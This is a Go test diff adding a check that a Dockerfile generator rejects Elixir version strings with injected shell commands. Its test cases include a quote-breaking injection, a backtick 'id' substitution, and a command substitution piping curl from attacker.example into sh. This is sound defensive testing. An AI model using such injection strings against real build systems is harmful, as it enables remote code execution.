@@ -506,6 +506,22 @@ func TestGenerateDockerfileRuntimeVersionNewlineRejected(t *testing.T) {
 	}
 }
 
+func TestGenerateDockerfileElixirVersionInjectionRejected(t *testing.T) {
+	cases := []string{
+		`1.14.3" "malicious-pkg`,
+		`$(curl http://attacker.example | sh)`,
+		"1.14.3`id`",
+	}
+	for _, v := range cases {
+		cfg := DefaultDockerConfig()
+		cfg.Runtime = config.Runtime{Name: "elixir", Version: v}
+		_, err := GenerateDockerfile(cfg, slog.Default())
+		if err == nil {
+			t.Errorf("expected error for Elixir version %q, got nil", v)
+		}
+	}
+}
+
 func TestGenerateDockerfileElixirRuntime(t *testing.T) {
 	cfg := DefaultDockerConfig()
 	cfg.Runtime = config.Runtime{Name: "elixir"}
